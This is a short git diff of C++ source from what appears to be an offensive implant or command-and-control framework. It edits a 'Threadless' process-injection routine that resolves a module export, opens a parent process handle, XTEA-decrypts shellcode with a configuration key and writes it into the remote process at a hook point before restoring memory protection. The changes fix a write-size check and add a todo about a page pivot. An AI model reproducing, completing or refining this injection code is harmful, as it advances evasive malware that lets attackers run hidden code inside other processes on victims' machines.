@@ -2,14 +2,15 @@
 namespace Injection {
 
     VOID Threadless(THREADLESS Threadless, LPVOID Shellcode, SIZE_T cbShellcode, SIZE_T ccbShellcode) {
+        // todo: needs page pivot (Flower)
         HEXANE
 
-        HANDLE Proc         = { };
-        ULONG Protect       = 0;
-        UINT_PTR pExport    = 0;
-        UINT_PTR exportCpy  = 0;
-        UINT_PTR pHook      = 0;
-        SIZE_T Read, Write  = 0;
+        HANDLE Proc             = { };
+        SIZE_T Write            = 0;
+        ULONG Protect           = 0;
+        UINT_PTR pExport        = 0;
+        UINT_PTR exportCpy      = 0;
+        UINT_PTR pHook          = 0;
 
         if (!(pExport   = Memory::LdrGetExport(SCAST(LPSTR, Threadless.Module.Buffer), RCAST(LPSTR, Threadless.Export.Buffer))) ||
             !(Proc      = Process::LdrGetParentHandle(RCAST(PBYTE, Threadless.Parent.Buffer))) ||
@@ -41,7 +42,7 @@ namespace Injection {
         Xtea::XteaCrypt(RCAST(PBYTE, Shellcode), cbShellcode, Ctx->Config.Key, FALSE);
 
         if (
-            !NT_SUCCESS(Ctx->Nt.NtWriteVirtualMemory(Proc, C_PTR(pHook + Threadless.Loader.Length), Shellcode, cbShellcode, &Write)) || Write != Rsrc->Size ||
+            !NT_SUCCESS(Ctx->Nt.NtWriteVirtualMemory(Proc, C_PTR(pHook + Threadless.Loader.Length), Shellcode, cbShellcode, &Write)) || Write != cbShellcode ||
             !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, RCAST(LPVOID*, &pHook), &cbShellcode, Protect, &Protect))) {
             return;
         }
